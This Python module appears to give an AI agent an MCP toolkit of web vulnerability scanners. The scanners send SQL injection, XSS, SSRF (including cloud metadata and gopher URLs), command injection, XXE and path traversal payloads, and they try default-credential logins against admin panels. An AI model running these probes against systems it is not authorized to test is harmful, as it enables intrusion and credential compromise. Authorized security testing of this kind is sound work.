#!/usr/bin/env python3
"""
漏洞检测工具模块 - Web漏洞扫描相关功能
包含: SQL注入、XSS、CSRF、SSRF、命令注入、XXE、IDOR、文件上传、认证绕过等
"""

import time
import re
import base64
import json
from urllib.parse import urlparse

from ._common import (
    GLOBAL_CONFIG, HAS_REQUESTS, get_verify_ssl
)

# 可选依赖
if HAS_REQUESTS:
    import requests


def register_vuln_tools(mcp):
    """注册所有漏洞检测工具到 MCP 服务器"""

    @mcp.tool()
    def vuln_check(url: str) -> dict:
        """漏洞检测 - 检测常见Web漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []

        # 1. 检测目录遍历
        try:
            test_url = url.rstrip('/') + "/../../../etc/passwd"
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
            if "root:" in resp.text:
                vulns.append({"type": "Path Traversal", "severity": "HIGH", "url": test_url})
        except Exception:
            pass

        # 2. 检测信息泄露
        info_paths = [".git/config", ".env", "phpinfo.php", "server-status", "actuator/env"]
        for path in info_paths:
            try:
                test_url = url.rstrip('/') + "/" + path
                resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                if resp.status_code == 200 and len(resp.content) > 100:
                    vulns.append({"type": "Information Disclosure", "severity": "MEDIUM", "url": test_url, "path": path})
            except Exception:
                pass

        # 3. 检测CORS配置
        try:
            resp = requests.get(url, headers={"Origin": "https://evil.com"}, timeout=5, verify=get_verify_ssl())
            if "access-control-allow-origin" in resp.headers:
                origin = resp.headers.get("access-control-allow-origin")
                if origin == "*" or origin == "https://evil.com":
                    vulns.append({"type": "CORS Misconfiguration", "severity": "MEDIUM", "detail": f"ACAO: {origin}"})
        except Exception:
            pass

        # 4. 检测安全头缺失
        try:
            resp = requests.get(url, timeout=5, verify=get_verify_ssl())
            missing_headers = []
            if "x-frame-options" not in resp.headers:
                missing_headers.append("X-Frame-Options")
            if "x-content-type-options" not in resp.headers:
                missing_headers.append("X-Content-Type-Options")
            if "x-xss-protection" not in resp.headers:
                missing_headers.append("X-XSS-Protection")
            if missing_headers:
                vulns.append({"type": "Missing Security Headers", "severity": "LOW", "headers": missing_headers})
        except Exception:
            pass

        # 5. 检测HTTP方法
        try:
            resp = requests.options(url, timeout=5, verify=get_verify_ssl())
            if "allow" in resp.headers:
                methods = resp.headers["allow"]
                dangerous = [m for m in ["PUT", "DELETE", "TRACE"] if m in methods.upper()]
                if dangerous:
                    vulns.append({"type": "Dangerous HTTP Methods", "severity": "MEDIUM", "methods": dangerous})
        except Exception:
            pass

        return {"success": True, "url": url, "vulnerabilities": vulns, "total": len(vulns)}

    @mcp.tool()
    def sqli_detect(url: str, param: str = None, deep_scan: bool = True) -> dict:
        """SQL注入检测 - 增强版，支持时间盲注和布尔盲注"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        error_payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND '1'='1", "1 AND 1=1", "' UNION SELECT NULL--"]
        error_patterns = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle", "sqlserver",
            "syntax error", "unclosed quotation", "quoted string not properly terminated",
            "warning: mysql", "valid mysql result", "mysqlclient", "mysqli",
            "pg_query", "pg_exec", "ora-", "microsoft ole db provider for sql server"
        ]

        base_url = url
        test_params = [param] if param else ["id", "page", "cat", "search", "q", "query", "user", "name"]

        # 1. 获取基线响应
        try:
            baseline_resp = requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
            baseline_length = len(baseline_resp.text)
        except Exception:
            baseline_length = 0

        for p in test_params:
            # 错误型注入检测
            for payload in error_payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={payload}"
                    else:
                        test_url = f"{base_url}?{p}={payload}"

                    resp = requests.get(test_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                    resp_lower = resp.text.lower()

                    for pattern in error_patterns:
                        if pattern in resp_lower:
                            vulns.append({
                                "type": "Error-based SQLi",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": pattern,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass

            if not deep_scan:
                continue

            # 2. 时间盲注检测
            time_payloads = [
                ("' AND SLEEP(3)--", 3),
                ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3),
                ("'; WAITFOR DELAY '0:0:3'--", 3),
                ("' AND pg_sleep(3)--", 3),
            ]
            for payload, delay in time_payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={payload}"
                    else:
                        test_url = f"{base_url}?{p}={payload}"

                    start = time.time()
                    requests.get(test_url, timeout=delay + 5, verify=get_verify_ssl())
                    elapsed = time.time() - start

                    if elapsed >= delay:
                        vulns.append({
                            "type": "Time-based Blind SQLi",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": f"响应延迟 {elapsed:.2f}s (预期 {delay}s)",
                            "url": test_url
                        })
                        break
                except Exception:
                    pass

            # 3. 布尔盲注检测
            bool_payloads = [
                ("' AND '1'='1", "' AND '1'='2"),
                ("' AND 1=1--", "' AND 1=2--"),
                ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
            ]
            for true_payload, false_payload in bool_payloads:
                try:
                    if "?" in base_url:
                        true_url = f"{base_url}&{p}={true_payload}"
                        false_url = f"{base_url}&{p}={false_payload}"
                    else:
                        true_url = f"{base_url}?{p}={true_payload}"
                        false_url = f"{base_url}?{p}={false_payload}"

                    true_resp = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                    false_resp = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())

                    len_diff = abs(len(true_resp.text) - len(false_resp.text))
                    if len_diff > baseline_length * 0.1 and len_diff > 50:
                        vulns.append({
                            "type": "Boolean-based Blind SQLi",
                            "severity": "HIGH",
                            "param": p,
                            "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                            "evidence": f"响应长度差异: {len_diff} bytes",
                            "url": true_url
                        })
                        break
                except Exception:
                    pass

        return {"success": True, "url": url, "sqli_vulns": vulns, "total": len(vulns), "deep_scan": deep_scan}

    @mcp.tool()
    def xss_detect(url: str, param: str = None) -> dict:
        """XSS检测 - 自动检测跨站脚本漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<body onload=alert(1)>"
        ]

        base_url = url
        test_params = [param] if param else ["search", "q", "query", "keyword", "name", "input", "text", "msg"]

        for p in test_params:
            for payload in payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"

                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                    if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                        vulns.append({
                            "type": "Reflected XSS",
                            "severity": "HIGH",
                            "param": p,
                            "payload": payload,
                            "url": test_url
                        })
                        break
                except Exception:
                    pass

        return {"success": True, "url": url, "xss_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def csrf_detect(url: str) -> dict:
        """CSRF检测 - 检测跨站请求伪造漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            html = resp.text.lower()

            # 检查CSRF Token
            has_csrf_token = any(token in html for token in [
                "csrf", "_token", "authenticity_token", "csrfmiddlewaretoken",
                "__requestverificationtoken", "antiforgery"
            ])

            # 检查SameSite Cookie
            samesite_missing = []
            for cookie in resp.cookies:
                cookie_str = str(resp.headers.get('Set-Cookie', ''))
                if 'samesite' not in cookie_str.lower():
                    samesite_missing.append(cookie.name)

            # 检查表单
            forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL)
            forms_without_csrf = 0
            for form in forms:
                if not any(token in form for token in ["csrf", "_token", "authenticity"]):
                    forms_without_csrf += 1

            if not has_csrf_token and forms_without_csrf > 0:
                vulns.append({
                    "type": "Missing CSRF Token",
                    "severity": "HIGH",
                    "detail": f"发现 {forms_without_csrf} 个表单缺少CSRF Token"
                })

            if samesite_missing:
                vulns.append({
                    "type": "Missing SameSite Cookie",
                    "severity": "MEDIUM",
                    "cookies": samesite_missing
                })

            # 检查Referer验证
            resp2 = requests.get(url, headers={"Referer": "https://evil.com"}, timeout=10, verify=get_verify_ssl())
            if resp2.status_code == resp.status_code:
                vulns.append({
                    "type": "No Referer Validation",
                    "severity": "LOW",
                    "detail": "服务器未验证Referer头"
                })

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {"success": True, "url": url, "csrf_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def ssrf_detect(url: str, param: str = None) -> dict:
        """SSRF检测 - 检测服务端请求伪造漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO"
        ]

        test_params = [param] if param else ["url", "uri", "path", "src", "source", "link", "redirect", "target", "dest", "fetch", "proxy"]

        for p in test_params:
            for payload in payloads:
                try:
                    if "?" in url:
                        test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{url}?{p}={requests.utils.quote(payload)}"

                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)

                    indicators = [
                        "root:", "localhost", "127.0.0.1", "internal",
                        "ami-id", "instance-id", "meta-data",
                        "redis_version", "connected_clients"
                    ]

                    for indicator in indicators:
                        if indicator in resp.text.lower():
                            vulns.append({
                                "type": "SSRF",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": indicator,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass

        return {"success": True, "url": url, "ssrf_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def cmd_inject_detect(url: str, param: str = None) -> dict:
        """命令注入检测 - 检测OS命令注入漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            "; id", "| id", "|| id", "&& id", "& id",
            "; whoami", "| whoami", "|| whoami",
            "`id`", "$(id)", "${id}",
            "; sleep 5", "| sleep 5", "& timeout 5",
            "| cat /etc/passwd", "; type C:\\Windows\\win.ini"
        ]

        indicators = [
            "uid=", "gid=", "groups=",
            "root:", "daemon:", "bin:",
            "extensions",
            "for 16-bit app support"
        ]

        test_params = [param] if param else ["cmd", "exec", "command", "ping", "query", "host", "ip", "file", "path", "dir"]

        for p in test_params:
            for payload in payloads:
                try:
                    if "?" in url:
                        test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{url}?{p}={requests.utils.quote(payload)}"

                    resp = requests.get(test_url, timeout=15, verify=get_verify_ssl())

                    for indicator in indicators:
                        if indicator in resp.text:
                            vulns.append({
                                "type": "Command Injection",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": indicator,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass

        return {"success": True, "url": url, "cmd_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def xxe_detect(url: str) -> dict:
        """XXE检测 - 检测XML外部实体注入漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
        ]

        headers = {"Content-Type": "application/xml"}

        for payload in payloads:
            try:
                resp = requests.post(url, data=payload, headers=headers, timeout=10, verify=get_verify_ssl())

                indicators = ["root:", "daemon:", "extensions", "for 16-bit"]
                for indicator in indicators:
                    if indicator in resp.text:
                        vulns.append({
                            "type": "XXE",
                            "severity": "CRITICAL",
                            "payload": payload[:100] + "...",
                            "evidence": indicator
                        })
                        break

                if any(err in resp.text.lower() for err in ["xml", "parser", "entity", "dtd"]):
                    vulns.append({
                        "type": "XXE Error Disclosure",
                        "severity": "MEDIUM",
                        "detail": "XML解析错误信息泄露"
                    })
            except Exception:
                pass

        return {"success": True, "url": url, "xxe_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def idor_detect(url: str, param: str = "id") -> dict:
        """IDOR检测 - 检测不安全的直接对象引用漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        findings = []

        test_ids = ["1", "2", "100", "1000", "0", "-1", "999999"]

        for test_id in test_ids:
            try:
                if "?" in url:
                    test_url = f"{url}&{param}={test_id}"
                else:
                    test_url = f"{url}?{param}={test_id}"

                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                if resp.status_code == 200 and len(resp.content) > 100:
                    findings.append({
                        "id": test_id,
                        "status": resp.status_code,
                        "size": len(resp.content)
                    })
            except Exception:
                pass

        if len(findings) > 1:
            sizes = [f["size"] for f in findings]
            if len(set(sizes)) > 1:
                vulns.append({
                    "type": "Potential IDOR",
                    "severity": "HIGH",
                    "param": param,
                    "detail": f"参数 {param} 可能存在IDOR漏洞，不同ID返回不同内容",
                    "findings": findings
                })

        return {"success": True, "url": url, "idor_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def file_upload_detect(url: str) -> dict:
        """文件上传漏洞检测 - 检测不安全的文件上传"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []

        test_files = [
            ("test.php", "<?php echo 'test'; ?>", "application/x-php"),
            ("test.php.jpg", "<?php echo 'test'; ?>", "image/jpeg"),
            ("test.phtml", "<?php echo 'test'; ?>", "text/html"),
            ("test.php%00.jpg", "<?php echo 'test'; ?>", "image/jpeg"),
            ("test.jsp", "<% out.println(\"test\"); %>", "application/x-jsp"),
            ("test.asp", "<% Response.Write(\"test\") %>", "application/x-asp"),
            ("test.svg", "<svg onload=alert(1)>", "image/svg+xml"),
            ("test.html", "<script>alert(1)</script>", "text/html"),
        ]

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            html = resp.text.lower()

            has_upload = 'type="file"' in html or "multipart/form-data" in html

            if has_upload:
                vulns.append({
                    "type": "File Upload Form Found",
                    "severity": "INFO",
                    "detail": "发现文件上传功能，需要手动测试"
                })

                if "accept=" in html:
                    vulns.append({
                        "type": "Client-side Validation Only",
                        "severity": "MEDIUM",
                        "detail": "仅有客户端文件类型验证，可能被绕过"
                    })

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "upload_vulns": vulns,
            "total": len(vulns),
            "test_payloads": [f[0] for f in test_files],
            "note": "文件上传漏洞需要手动测试，以上为建议测试的文件类型"
        }

    @mcp.tool()
    def auth_bypass_detect(url: str) -> dict:
        """认证绕过检测 - 检测常见认证绕过漏洞 (带SPA误报过滤)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        # 导入响应过滤器
        try:
            from core.response_filter import get_response_filter
            resp_filter = get_response_filter()
            resp_filter.calibrate(url)
        except ImportError:
            resp_filter = None

        vulns = []
        filtered_count = 0

        bypass_paths = [
            "/admin", "/admin/", "/admin//", "/admin/./",
            "/Admin", "/ADMIN", "/administrator",
            "/admin%20", "/admin%00", "/admin..;/",
            "/admin;", "/admin.json", "/admin.html",
            "//admin", "///admin", "/./admin",
            "/admin?", "/admin#", "/admin%2f"
        ]

        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
        ]

        base_url = url.rstrip('/')

        # 获取基线响应
        baseline_html = ""
        baseline_status = 0
        try:
            baseline_resp = requests.get(base_url + "/admin", timeout=5, verify=get_verify_ssl(), allow_redirects=False)
            baseline_html = baseline_resp.text
            baseline_status = baseline_resp.status_code
        except Exception:
            pass

        # 路径绕过测试
        for path in bypass_paths:
            try:
                test_url = base_url + path
                resp = requests.get(test_url, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                if resp.status_code == 200:
                    if resp_filter:
                        validation = resp_filter.validate_auth_bypass(
                            test_url, resp.text, baseline_html, resp.status_code
                        )
                        if not validation["valid"]:
                            filtered_count += 1
                            continue
                        confidence = validation["confidence"]
                        reason = validation["reason"]
                    else:
                        confidence = 0.5
                        reason = "Basic check passed"

                    vulns.append({
                        "type": "Path Bypass",
                        "severity": "HIGH" if confidence > 0.7 else "MEDIUM",
                        "path": path,
                        "status": resp.status_code,
                        "confidence": confidence,
                        "evidence": reason
                    })
            except Exception:
                pass

        # 头部绕过测试
        for headers in bypass_headers:
            try:
                resp = requests.get(base_url + "/admin", headers=headers, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                if resp.status_code == 200:
                    if resp_filter:
                        validation = resp_filter.validate_auth_bypass(
                            base_url + "/admin", resp.text, baseline_html, resp.status_code
                        )
                        if not validation["valid"]:
                            filtered_count += 1
                            continue
                        confidence = validation["confidence"]
                        reason = validation["reason"]
                    else:
                        confidence = 0.5
                        reason = "Basic check passed"

                    vulns.append({
                        "type": "Header Bypass",
                        "severity": "HIGH" if confidence > 0.7 else "MEDIUM",
                        "headers": headers,
                        "status": resp.status_code,
                        "confidence": confidence,
                        "evidence": reason
                    })
            except Exception:
                pass

        vulns.sort(key=lambda x: x.get("confidence", 0), reverse=True)

        return {
            "success": True,
            "url": url,
            "auth_bypass_vulns": vulns,
            "total": len(vulns),
            "filtered_spa_fallback": filtered_count,
            "baseline_status": baseline_status
        }

    @mcp.tool()
    def logic_vuln_check(url: str) -> dict:
        """逻辑漏洞检测 - 检测常见业务逻辑漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []
        recommendations = []

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            html = resp.text.lower()

            # 1. 检测价格/数量参数
            price_params = ["price", "amount", "quantity", "qty", "total", "discount", "coupon"]
            for param in price_params:
                if param in html:
                    findings.append({
                        "type": "Price/Quantity Parameter",
                        "severity": "MEDIUM",
                        "detail": f"发现 {param} 参数，可能存在价格篡改漏洞"
                    })
                    recommendations.append(f"测试 {param} 参数是否可被篡改为负数或极小值")

            # 2. 检测验证码
            if "captcha" in html or "验证码" in html:
                findings.append({
                    "type": "Captcha Found",
                    "severity": "INFO",
                    "detail": "发现验证码，测试是否可绕过"
                })
                recommendations.append("测试验证码是否可重复使用、是否可删除参数绕过")

            # 3. 检测短信/邮件验证
            if any(x in html for x in ["sms", "短信", "验证码", "email", "邮箱"]):
                findings.append({
                    "type": "SMS/Email Verification",
                    "severity": "INFO",
                    "detail": "发现短信/邮箱验证功能"
                })
                recommendations.append("测试验证码是否可爆破、是否有频率限制")

            # 4. 检测支付相关
            if any(x in html for x in ["pay", "payment", "支付", "checkout", "order"]):
                findings.append({
                    "type": "Payment Function",
                    "severity": "HIGH",
                    "detail": "发现支付功能，需重点测试"
                })
                recommendations.extend([
                    "测试订单金额是否可篡改",
                    "测试是否可修改支付状态",
                    "测试是否存在并发支付漏洞"
                ])

            # 5. 检测用户相关
            if any(x in html for x in ["user", "profile", "account", "用户", "个人"]):
                findings.append({
                    "type": "User Function",
                    "severity": "MEDIUM",
                    "detail": "发现用户功能"
                })
                recommendations.extend([
                    "测试是否可越权访问其他用户信息",
                    "测试密码重置流程是否安全",
                    "测试是否可批量注册"
                ])

            # 6. 检测API接口
            if any(x in html for x in ["api", "/v1/", "/v2/", "graphql"]):
                findings.append({
                    "type": "API Endpoint",
                    "severity": "MEDIUM",
                    "detail": "发现API接口"
                })
                recommendations.extend([
                    "测试API是否有认证",
                    "测试是否存在未授权访问",
                    "测试是否有速率限制"
                ])

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "findings": findings,
            "recommendations": recommendations,
            "note": "逻辑漏洞需要结合业务场景手动测试，以上为自动化检测建议"
        }

    @mcp.tool()
    def deserialize_detect(url: str, param: str = None) -> dict:
        """反序列化漏洞检测 - 检测Java/PHP/Python反序列化漏洞 (A08)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        java_payloads = [
            ("aced0005", "Java序列化魔数"),
            ("rO0AB", "Java Base64序列化"),
            ("H4sIAAAA", "Java Gzip序列化"),
        ]

        php_payloads = [
            ('O:8:"stdClass"', "PHP对象序列化"),
            ("a:1:{", "PHP数组序列化"),
            ("s:4:", "PHP字符串序列化"),
        ]

        python_payloads = [
            ("gASV", "Python Pickle Base64"),
            ("(dp0", "Python Pickle"),
            ("cos\nsystem", "Python Pickle RCE"),
        ]

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            content = resp.text
            cookies = resp.cookies.get_dict()

            for payload, desc in java_payloads + php_payloads + python_payloads:
                if payload in content:
                    findings.append({
                        "type": "Response Content",
                        "pattern": payload,
                        "description": desc,
                        "severity": "HIGH"
                    })

            for name, value in cookies.items():
                for payload, desc in java_payloads + php_payloads + python_payloads:
                    if payload in value:
                        findings.append({
                            "type": "Cookie",
                            "cookie_name": name,
                            "pattern": payload,
                            "description": desc,
                            "severity": "CRITICAL"
                        })

            deser_endpoints = [
                "/invoker/readonly", "/invoker/JMXInvokerServlet",
                "/_async/AsyncResponseService", "/wls-wsat/",
                "/solr/admin/cores", "/actuator",
            ]

            base_url = url.rstrip('/')
            for endpoint in deser_endpoints:
                try:
                    r = requests.get(f"{base_url}{endpoint}", timeout=5, verify=get_verify_ssl())
                    if r.status_code != 404:
                        findings.append({
                            "type": "Dangerous Endpoint",
                            "endpoint": endpoint,
                            "status_code": r.status_code,
                            "severity": "HIGH"
                        })
                except Exception:
                    pass

            if param:
                test_payloads = [
                    ('O:8:"stdClass":0:{}', "PHP"),
                    ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "Java"),
                ]
                for payload, lang in test_payloads:
                    try:
                        test_url = f"{url}?{param}={payload}"
                        r = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                        if r.status_code == 500 or "exception" in r.text.lower():
                            findings.append({
                                "type": "Parameter Injection",
                                "param": param,
                                "language": lang,
                                "severity": "CRITICAL",
                                "detail": "参数可能存在反序列化漏洞"
                            })
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "recommendations": [
                "避免反序列化不可信数据",
                "使用白名单验证反序列化类",
                "升级到安全版本的序列化库",
                "使用JSON等安全的数据格式替代"
            ] if findings else []
        }

    def _cms_weak_password_detect(url: str, cms: str, cms_config: dict, username: str = None) -> dict:
        """CMS专用弱口令检测辅助函数"""
        findings = []
        base_url = url.rstrip('/')

        endpoints = cms_config.get("endpoints", [])
        credentials = cms_config.get("credentials", [])
        auth_type = cms_config.get("auth_type", "form")
        check_only = cms_config.get("check_only", False)
        user_field = cms_config.get("user_field", "username")
        pass_field = cms_config.get("pass_field", "password")
        success_indicators = cms_config.get("success_indicators", ["logout", "dashboard", "welcome"])

        exposed_panels = []

        for endpoint in endpoints:
            test_url = f"{base_url}{endpoint}"

            # 只检查是否暴露 (如 Nginx status)
            if check_only:
                try:
                    r = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                    if r.status_code == 200:
                        for indicator in success_indicators:
                            if indicator in r.text.lower():
                                exposed_panels.append({
                                    "cms": cms,
                                    "url": test_url,
                                    "type": "Information Exposure"
                                })
                                break
                except Exception:
                    pass
                continue

            # Basic Auth
            if auth_type == "basic":
                for user, pwd in credentials:
                    if username:
                        user = username
                    try:
                        r = requests.get(
                            test_url,
                            auth=(user, pwd),
                            timeout=5,
                            verify=get_verify_ssl()
                        )
                        if r.status_code == 200:
                            for indicator in success_indicators:
                                if indicator in r.text.lower():
                                    findings.append({
                                        "type": "Weak Credential",
                                        "cms": cms,
                                        "endpoint": endpoint,
                                        "username": user,
                                        "password": pwd,
                                        "auth_type": "basic",
                                        "severity": "CRITICAL"
                                    })
                                    break
                    except Exception:
                        pass
            else:
                # Form-based Auth
                for user, pwd in credentials:
                    if username:
                        user = username
                    try:
                        data = {user_field: user, pass_field: pwd}
                        r = requests.post(
                            test_url,
                            data=data,
                            timeout=5,
                            verify=get_verify_ssl(),
                            allow_redirects=True
                        )
                        response_text = r.text.lower()
                        for indicator in success_indicators:
                            if indicator in response_text:
                                findings.append({
                                    "type": "Weak Credential",
                                    "cms": cms,
                                    "endpoint": endpoint,
                                    "username": user,
                                    "password": pwd,
                                    "auth_type": "form",
                                    "severity": "CRITICAL"
                                })
                                break
                    except Exception:
                        pass

        return {
            "success": True,
            "url": url,
            "cms_targeted": cms,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "exposed_panels": exposed_panels,
            "tested_endpoints": endpoints,
            "tested_credentials": len(credentials),
            "recommendations": [
                f"修改 {cms} 默认凭证",
                "启用账户锁定机制",
                "实施多因素认证",
                "限制管理面板访问IP"
            ] if findings else []
        }

    @mcp.tool()
    def weak_password_detect(url: str, username: str = None, cms_hint: str = None) -> dict:
        """弱密码/默认凭证检测 - 检测常见弱密码和默认凭证 (A07)

        Args:
            url: 目标URL
            username: 指定用户名进行测试 (可选)
            cms_hint: CMS/框架提示 (如 "WordPress", "Tomcat")，来自tech_detect结果

        当提供 cms_hint 时，会使用针对该CMS的专用凭证字典和登录端点。
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        # 如果提供了 CMS 提示，使用专用配置
        if cms_hint:
            try:
                from core.pipeline import CMS_DEFAULT_CREDENTIALS
                if cms_hint in CMS_DEFAULT_CREDENTIALS:
                    cms_config = CMS_DEFAULT_CREDENTIALS[cms_hint]
                    return _cms_weak_password_detect(url, cms_hint, cms_config, username)
            except ImportError:
                pass  # 降级到通用检测

        # 通用默认凭证
        default_creds = [
            ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
            ("admin", "admin123"), ("root", "root"), ("root", "toor"),
            ("test", "test"), ("guest", "guest"), ("user", "user"),
            ("administrator", "administrator"), ("admin", ""),
            ("tomcat", "tomcat"), ("manager", "manager"),
        ]

        # 通用登录端点
        login_endpoints = [
            "/login", "/admin/login", "/user/login", "/api/login",
            "/auth/login", "/signin", "/admin", "/manager/html",
            "/wp-login.php", "/administrator",
        ]

        try:
            base_url = url.rstrip('/')

            login_found = []
            for endpoint in login_endpoints:
                try:
                    r = requests.get(f"{base_url}{endpoint}", timeout=5, verify=get_verify_ssl())
                    if r.status_code == 200 and any(x in r.text.lower() for x in ["password", "login", "密码", "登录"]):
                        login_found.append(endpoint)
                except Exception:
                    pass

            for endpoint in login_found[:3]:
                login_url = f"{base_url}{endpoint}"

                try:
                    r = requests.get(login_url, timeout=5, verify=get_verify_ssl())

                    user_fields = ["username", "user", "login", "email", "account"]
                    pass_fields = ["password", "pass", "pwd"]

                    for user, pwd in default_creds[:10]:
                        if username:
                            user = username

                        for uf in user_fields:
                            for pf in pass_fields:
                                try:
                                    data = {uf: user, pf: pwd}
                                    resp = requests.post(login_url, data=data, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                                    if resp.status_code in [302, 303] or \
                                       "logout" in resp.text.lower() or \
                                       "dashboard" in resp.text.lower() or \
                                       "welcome" in resp.text.lower():
                                        findings.append({
                                            "type": "Weak Credential",
                                            "endpoint": endpoint,
                                            "username": user,
                                            "password": pwd,
                                            "severity": "CRITICAL"
                                        })
                                        break
                                except Exception:
                                    pass
                            if findings:
                                break
                        if findings:
                            break
                except Exception:
                    pass

            admin_panels = {
                "/phpmyadmin/": [("root", ""), ("root", "root")],
                "/adminer.php": [("root", ""), ("root", "root")],
                "/manager/html": [("tomcat", "tomcat"), ("admin", "admin")],
            }

            for panel, creds in admin_panels.items():
                try:
                    r = requests.get(f"{base_url}{panel}", timeout=5, verify=get_verify_ssl())
                    if r.status_code == 200:
                        findings.append({
                            "type": "Admin Panel Found",
                            "endpoint": panel,
                            "default_creds": creds,
                            "severity": "MEDIUM",
                            "detail": "发现管理面板，建议测试默认凭证"
                        })
                except Exception:
                    pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "login_pages": login_found if 'login_found' in dir() else [],
            "vulnerable": len([f for f in findings if f["type"] == "Weak Credential"]) > 0,
            "findings": findings,
            "recommendations": [
                "强制使用强密码策略",
                "修改所有默认凭证",
                "启用账户锁定机制",
                "实施多因素认证",
                "添加登录失败延迟"
            ] if findings else []
        }

    @mcp.tool()
    def security_headers_check(url: str) -> dict:
        """HTTP安全头检测 - 检测缺失或配置错误的安全头 (A05)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        security_headers = {
            "Strict-Transport-Security": {
